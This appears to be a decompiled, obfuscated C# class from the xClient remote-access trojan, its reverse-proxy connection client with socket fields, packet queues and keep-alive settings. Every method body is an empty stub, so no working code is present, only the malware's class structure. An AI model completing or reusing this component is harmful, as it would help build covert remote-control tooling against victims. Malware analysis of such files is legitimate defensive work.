using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using dg3ypDAonQcOidMs0w;
using xClient.Core.NetSerializer;
using xClient.Core.ReverseProxy.Packets;

public class GClass33
{
	public delegate void GDelegate3(GClass33 s, Exception ex);

	public delegate void GDelegate4(GClass33 s, bool connected);

	public delegate void GDelegate5(GClass33 s, GInterface4 packet);

	public delegate void GDelegate6(GClass33 s, GInterface4 packet, long length, byte[] rawData);

	public enum GEnum8
	{
		const_0,
		const_1
	}

	[CompilerGenerated]
	private sealed class Class27
	{
		public int int_0;

		internal static Class27 Onseb7rf37R5Nj75ly8;

		internal bool method_0(GClass1 t)
		{
			return true;
		}

		static Class27()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			WP6RZJql8gZrNhVA9v.iXLoKRSpAw();
		}

		internal static void RkiDcKrYvs68sWtCAVH()
		{
		}

		internal static void XdAEBxrRJXfT8etFhog()
		{
		}

		internal static bool RfM4WPrS180pPYk58uI()
		{
			return true;
		}

		internal static Class27 UDfPrircxkrPhFMZW4s()
		{
			return null;
		}

		internal static int k27FpErayaMm8J819Iu(object object_0)
		{
			return 0;
		}
	}

	[CompilerGenerated]
	private GDelegate3 gdelegate3_0;

	[CompilerGenerated]
	private GDelegate4 gdelegate4_0;

	[CompilerGenerated]
	private GDelegate5 gdelegate5_0;

	[CompilerGenerated]
	private GDelegate6 gdelegate6_0;

	private Socket socket_0;

	private List<GClass1> list_0;

	private readonly object object_0;

	private byte[] byte_0;

	private byte[] byte_1;

	private readonly Queue<byte[]> queue_0;

	private bool bool_0;

	private readonly object object_1;

	private readonly Queue<byte[]> queue_1;

	private bool bool_1;

	private readonly object object_2;

	private byte[] byte_2;

	private bool bool_2;

	private int int_0;

	private int int_1;

	private int int_2;

	private int int_3;

	private int int_4;

	private GEnum8 genum8_0;

	[CompilerGenerated]
	private bool bool_3;

	[CompilerGenerated]
	private Serializer serializer_0;

	private static GClass33 Ibk6kn8PeSDJvQF5VJi;

	public int BUFFER_SIZE => 0;

	public uint KEEP_ALIVE_TIME => 0u;

	public uint KEEP_ALIVE_INTERVAL => 0u;

	public int HEADER_SIZE => 0;

	public int MAX_PACKET_SIZE => 0;

	public GClass1[] ProxyClients => null;

	public bool Connected
	{
		[CompilerGenerated]
		get
		{
			return true;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	protected Serializer Serializer
	{
		[CompilerGenerated]
		get
		{
			return null;
		}
		[CompilerGenerated]
		set
		{
		}
	}

	public event GDelegate3 Event_0
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event GDelegate4 Event_1
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event GDelegate5 Event_2
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event GDelegate6 Event_3
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	private void method_0(Exception ex)
	{
	}

	private void method_1(bool connected)
	{
	}

	private void method_2(GInterface4 packet)
	{
	}

	private void method_3(GInterface4 packet, long length, byte[] rawData)
	{
	}

	protected GClass33()
	{
	}

	protected void method_4(IPAddress ip, ushort port)
	{
	}

	private void method_5(IAsyncResult result)
	{
	}

	private void method_6(object state)
	{
	}

	public void method_7<T>(T packet) where T : GInterface4
	{
	}

	public void method_8<T>(T packet) where T : GInterface4
	{
	}

	private void method_9(object state)
	{
	}

	private byte[] method_10(byte[] payload)
	{
		return null;
	}

	private void method_11(bool clear = false)
	{
	}

	public void method_12()
	{
	}

	public void method_13(ReverseProxyConnect command)
	{
	}

	public GClass1 method_14(int connectionId)
	{
		return null;
	}

	public void method_15(int connectionId)
	{
	}

	static GClass33()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		w9gVDMrX6jZqjwBNTIk();
	}

	internal static object lK5vvp80l4TaHNqHgj7(object object_3, object object_4)
	{
		return null;
	}

	internal static bool SGYpEm8eamAJIbDnrGK()
	{
		return true;
	}

	internal static GClass33 zxDiUU82yybj9SQCTHs()
	{
		return null;
	}

	internal static object hb9JNW8KqRIhJIWGG9U(object object_3, object object_4)
	{
		return null;
	}

	internal static void wIfq5B8BYV71bETqenI(object object_3, object object_4, object object_5, long length, object object_6)
	{
	}

	internal static object mGpSQA8NxeZqLImykaF(object object_3)
	{
		return null;
	}

	internal static void Q29AKX8ZqhwhwNpZ8py(object object_3)
	{
	}

	internal static void CPgOdV8QmTEfg7L9j0w()
	{
	}

	internal static void hhsanT8jwFqlk1YCTXv()
	{
	}

	internal static void PqiQqN8sxniaE7eucJj(object object_3, object object_4, int int_5)
	{
	}

	internal static object ffBmIN8detEa3WDnnwP(object object_3, object object_4, int int_5, int int_6, SocketFlags socketFlags_0, object object_5, object object_6)
	{
		return null;
	}

	internal static int OARNub8Aa446MHBrVii(object object_3, object object_4)
	{
		return 0;
	}

	internal static object PnYryK83tiJwQl0DWw9(int int_5)
	{
		return null;
	}

	internal static void Yq0Uwo81e3c25KPXCgx(object object_3, object object_4, int int_5)
	{
	}

	internal static bool N8F5JP8qgYOIXFSOcu7(object object_3)
	{
		return true;
	}

	internal static int qqTPFA8b9vGTLgPnonA(object object_3)
	{
		return 0;
	}

	internal static int iKOJF187BfkgffR5MmO(object object_3, int int_5)
	{
		return 0;
	}

	internal static void lGV9Sk8uG75NhDNq8G9(object object_3, int int_5, object object_4, int int_6, int int_7)
	{
	}

	internal static object L4lQHG8zRWGS5fsSnMI(object object_3)
	{
		return null;
	}

	internal static object DwQ53HrFjUUjdVZ7l2K(object object_3, object object_4)
	{
		return null;
	}

	internal static void pOimF5rCLopgJFtaL3W(object object_3)
	{
	}

	internal static object qW0nlUrWp3XQ0IhWgQJ(object object_3)
	{
		return null;
	}

	internal static object RMeAdwro1gXEvMer0Lf(int int_5)
	{
		return null;
	}

	internal static void PpMr3pr6ipQShWZC2qs(object object_3)
	{
	}

	internal static void gHFCwurgQcU9ledW3h3(object object_3)
	{
	}

	internal static void jkfRPHrDPajo2yWcDLp(object object_3)
	{
	}

	internal static void VYGhf2rGWQYR32Qtpbm(object object_3, int int_5)
	{
	}

	internal static int Tjt3nQrn2RV2ulUIdlx(object object_3)
	{
		return 0;
	}

	internal static void w9gVDMrX6jZqjwBNTIk()
	{
	}
}
